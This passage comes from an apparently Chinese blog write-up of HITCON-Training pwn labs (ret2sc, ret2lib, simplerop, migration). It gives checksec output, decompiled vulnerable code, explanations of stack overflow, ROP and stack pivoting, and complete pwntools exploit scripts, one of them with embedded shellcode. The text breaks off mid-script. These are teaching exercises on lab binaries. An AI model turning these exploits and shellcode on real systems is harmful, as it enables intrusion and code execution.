class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [esp+1Ch] [ebp-14h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Name:\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;name, <span class=\"number\">0x32</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Try your best:\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"keyword\">int</span>)gets(&amp;s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2sc\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./ret2sc\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># ref: https://www.exploit-db.com/shellcodes/41630</span></span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\xeb\\x10\\x5e\\x31\\xc9\\xb1\\x15\\x8a\\x06\\x34\\xe9\\x88\\x06\\x46\\xe2\\xf7\\xeb\\x05\\xe8\\xeb\\xff\\xff\\xff\\xd8\\x20\\xb8\\x81\\xc6\\xc6\\x9a\\x81\\x81\\xc6\\x8b\\x80\\x87\\x60\\x0a\\x83\\xe2\\xb1\\x70\\x24\\x69\"</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x804a060</span></span><br><span class=\"line\">offset = <span class=\"number\">0x1c</span> + <span class=\"number\">4</span></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"Name:\"</span>, shellcode)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"Try your best:\"</span>, offset *<span class=\"string\">\"a\"</span> + p32(bss_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab4——ret2lib\"><a href=\"#Lab4——ret2lib\" class=\"headerlink\" title=\"Lab4——ret2lib\"></a>Lab4——ret2lib</h2><h3 id=\"防护-2\"><a href=\"#防护-2\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>开启了NX，无法使用ret2sc。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab4$ checksec ret2lib</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab4/ret2lib&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>程序首先会主动leak出任意地址，可以通过这一点leak got表获取libc的加载基址，然后构造rop链即可。</p>\n<p>注意在Print_message中dest离eip的偏移为0x38 + 4</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> **v3; <span class=\"comment\">// ST04_4</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> src; <span class=\"comment\">// [esp+12h] [ebp-10Eh]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+112h] [ebp-Eh]</span></span><br><span class=\"line\">  _DWORD *v8; <span class=\"comment\">// [esp+11Ch] [ebp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"###############################\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Do you know return to library ?\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"###############################\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"What do you want to see in memory?\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Give me an address (in dec) :\"</span>);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0xA</span>u);</span><br><span class=\"line\">  v8 = (_DWORD *)strtol(&amp;buf, v3, v4);</span><br><span class=\"line\">  See_something(v8);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Leave some message for me :\"</span>);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;src, <span class=\"number\">0x100</span>u);</span><br><span class=\"line\">  Print_message(&amp;src);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Thanks you ~\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2lib\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./ret2lib\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">p.send(str(elf.got[<span class=\"string\">'__libc_start_main'</span>]))</span><br><span class=\"line\">addr = int(p.recvline().split(<span class=\"string\">\": \"</span>)[<span class=\"number\">-1</span>].strip(), <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">write = libc.symbols[<span class=\"string\">'write'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">main_addr = <span class=\"number\">0x8048570</span></span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x38</span> + <span class=\"number\">4</span></span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(main_addr)</span><br><span class=\"line\">rop += p32(binsh)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"for me :\"</span>, rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab5——simplerop\"><a href=\"#Lab5——simplerop\" class=\"headerlink\" title=\"Lab5——simplerop\"></a>Lab5——simplerop</h2><h3 id=\"防护-3\"><a href=\"#防护-3\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab5$ checksec simplerop</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab5/simplerop&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>直接栈溢出。不过该题是静态链接的，没有加载libc.so，并且题目中没有system，所以需要手动构造ROP链，利用系统调用sys_execve执行利用。</p>\n<p>首先要把参数写到相应的寄存器，然后执行int 0x80</p>\n<ul>\n<li>系统调用号存入EAX（execve的为11）</li>\n<li>通过ebx,ecx,edx,esi,edi等传递参数</li>\n<li>最后调用int 0x80</li>\n</ul>\n<p>这里要用到ROPgadget工具，来搜索可用的gadget。主要就是一些pop|ret和int 0x80的gadget。</p>\n<p>另外，题目中没有现成的/bin/sh字符串，需要首先写入。我采用的是调用静态链接进来的read函数，写入到bss段。官方writeup中采用了一种更为巧妙的方法，使用如下的gadget</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov dword ptr [edx], eax ;</span><br><span class=\"line\">ret ;</span><br></pre></td></tr></table></figure>\n<p>通过<code>pop eax;ret pop edx; ret</code>将字符串四位四位的写到data段（或bss段）。可以看到这种方法的通用性更强。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#write to memory</span></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span>*<span class=\"number\">32</span></span><br><span class=\"line\">payload += p32(pop_edx_ret)</span><br><span class=\"line\">payload += p32(buf)</span><br><span class=\"line\">payload += p32(pop_eax_ret)</span><br><span class=\"line\">payload += <span class=\"string\">\"/bin\"</span></span><br><span class=\"line\">payload += p32(gadget)</span><br><span class=\"line\">payload += p32(pop_edx_ret)</span><br><span class=\"line\">payload += p32(buf+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += p32(pop_eax_ret)</span><br><span class=\"line\">payload += <span class=\"string\">\"/sh\\x00\"</span></span><br><span class=\"line\">payload += p32(gadget)</span><br></pre></td></tr></table></figure>\n<p>我的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./simplerop\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./simplerop\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">int80 = <span class=\"number\">0x080493e1</span></span><br><span class=\"line\">popecx_popebx = <span class=\"number\">0x0806e851</span></span><br><span class=\"line\">popeax = <span class=\"number\">0x080bae06</span></span><br><span class=\"line\">popedx = <span class=\"number\">0x0806e82a</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x80ec2c0</span></span><br><span class=\"line\">main_addr = <span class=\"number\">0x8048e24</span></span><br><span class=\"line\">read = <span class=\"number\">0x806cd50</span></span><br><span class=\"line\">offset = <span class=\"number\">0x20</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(read)</span><br><span class=\"line\">rop += p32(main_addr)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p32(bss_addr)</span><br><span class=\"line\">rop += p32(<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">rop = (offset - <span class=\"number\">8</span>) * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(popeax)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0xb</span>)</span><br><span class=\"line\">rop += p32(popecx_popebx)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) + p32(bss_addr)</span><br><span class=\"line\">rop += p32(popedx)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p32(int80)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab6——migration\"><a href=\"#Lab6——migration\" class=\"headerlink\" title=\"Lab6——migration\"></a>Lab6——migration</h2><h3 id=\"防护-4\"><a href=\"#防护-4\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab6$ checksec migration</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab6/migration&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题溢出的字节较少，而又需要leak libc，构造利用链，所以显然栈空间是不够的；但是又不能先布置shellcode，再<code>jmp esp</code>跳到shellcode执行，所以需要考虑其他方法。根据题目名字的提示，应该是用栈迁移的方法。</p>\n<p>用ROPgadget搜索，注意到以下gadget</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x08048418 : leave ; ret</span><br></pre></td></tr></table></figure>\n<p>我们通过溢出将栈布局为如下格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">buffer padding | fake ebp | leave ret addr|</span><br></pre></td></tr></table></figure>\n<ul>\n<li>函数的返回地址被覆盖为leave_ret的地址，这样在函数执行完自己的leave_ret后还会在执行一次leave_ret。当函数执行完自己的leave时，ebp为fake ebp的值，即指向ebp2；当函数再执行自己的ret的时候，会执行leave_ret，先令esp也指向ebp2，然后将fake ebp处的第一个4bytes pop给ebp，即将ebp的值修改为ebp2，然后执行ret，将fake ebp后的第二个4bytes所存的地址给eip，即将eip的值修改为target function addr。</li>\n<li>如果调用的是函数，则函数入口点首先会调用push ebp，就会将ebp2的值压栈；然后调用mov ebp，esp，ebp指向当前基地址。</li>\n<li>由上可知，我们fake ebp处假的栈桢结构如下：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake ebp</span><br><span class=\"line\"></span><br><span class=\"line\">ebp2 | target function addr | leave ret addr | arg1 | arg2</span><br></pre></td></tr></table></figure>\n<ul>\n<li>当程序在执行完target function之后，会再执行两次leave_ret，如果我们在ebp2处也布置好了对应的内容，就可以一直控制程序的执行流程</li>\n</ul>\n<p>我们需要一块可以写的内存，并且我们还知道这块内存的地址。所以通过gdb调试可以看出，由于未开启PIE，elf文件所加载的地址我们是知道的，而这其中可读可写的段有0x804a000~0x804b000，在这0x1000个bytes中找一块内存区域即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  vmmap</span><br><span class=\"line\">Start      End        Offset     Perm Path</span><br><span class=\"line\">0x08048000 0x08049000 0x00000000 r-x /home/liwc/pwn/HITCON-Training/LAB/lab6/migration</span><br><span class=\"line\">0x08049000 0x0804a000 0x00000000 r-- /home/liwc/pwn/HITCON-Training/LAB/lab6/migration</span><br><span class=\"line\">0x0804a000 0x0804b000 0x00001000 rw- /home/liwc/pwn/HITCON-Training/LAB/lab6/migration</span><br><span class=\"line\">0xf7dfe000 0xf7dff000 0x00000000 rw- </span><br><span class=\"line\">0xf7dff000 0xf7faf000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7faf000 0xf7fb1000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fb1000 0xf7fb2000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fb2000 0xf7fb5000 0x00000000 rw- </span><br><span class=\"line\">0xf7fd3000 0xf7fd4000 0x00000000 rw- </span><br><span class=\"line\">0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]</span><br><span class=\"line\">0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]</span><br><span class=\"line\">0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xfffdd000 0xffffe000 0x00000000 rw- [stack]</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><h4 id=\"1-将fake-frame写到RW段\"><a href=\"#1-将fake-frame写到RW段\" class=\"headerlink\" title=\"1.将fake_frame写到RW段\"></a>1.将fake_frame写到RW段</h4><p>执行两次leave ret跳转到rwadddr</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># retn_addr</span></span><br><span class=\"line\">rop += p32(leaveret) <span class=\"comment\"># retn_addr of read</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0x100</span>) <span class=\"comment\"># arg3</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"2-leak-libc\"><a href=\"#2-leak-libc\" class=\"headerlink\" title=\"2.leak libc\"></a>2.leak libc</h4><p>执行两次leave ret跳转到rwaddr+0x100</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop += p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(puts_plt) <span class=\"comment\"># retn_addr</span></span><br><span class=\"line\">rop += p32(pop1) <span class=\"comment\"># adjust stack to next part chain of rop</span></span><br><span class=\"line\">rop += p32(elf.got[<span class=\"string\">'__libc_start_main'</span>]) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># call read</span></span><br><span class=\"line\">rop += p32(leaveret) <span class=\"comment\"># retn_addr of read</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\"># arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0x100</span>) <span class=\"comment\"># arg3</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"3-RCE\"><a href=\"#3-RCE\" class=\"headerlink\" title=\"3.RCE\"></a>3.RCE</h4><p>rwaddr+0x100处直接getshell</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop = p32(rwaddr)</span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">rop += p32(binsh)</span><br></pre></td></tr></table></figure>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./migration\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./migration\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">offset = <span class=\"number\">0x28</span></span><br><span class=\"line\">popebp = <span class=\"number\">0x0804856b</span></span><br><span class=\"line\">ret = <span class=\"number\">0x08048356</span></span><br><span class=\"line\">leaveret = <span class=\"number\">0x08048418</span></span><br><span class=\"line\">rwaddr = <span class=\"number\">0x0804b000</span><span class=\"number\">-0x300</span></span><br><span class=\"line\"><span class=\"comment\"># 0x0804836d : pop ebx ; ret</span></span><br><span class=\"line\">pop1 = <span class=\"number\">0x0804836d</span></span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">'read'</span>]</span><br><span class=\"line\">puts_plt = 